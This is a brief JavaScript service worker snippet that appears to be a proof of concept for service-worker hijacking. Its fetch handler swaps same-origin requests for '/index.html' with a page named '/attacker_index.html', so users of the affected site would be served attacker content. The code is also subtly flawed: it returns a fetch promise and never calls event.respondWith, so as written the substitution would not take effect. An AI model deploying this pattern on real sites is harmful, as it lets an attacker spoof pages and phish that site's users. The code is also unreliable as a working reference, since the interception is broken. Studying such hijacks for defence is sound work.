self.addEventListener('fetch', event => {
  const url = new URL(event.request.url);
  console.log(url)
  
  if (url.origin == location.origin && url.pathname === '/index.html') {
    return fetch('/attacker_index.html')
  }
  
  return fetch(url);
  
});
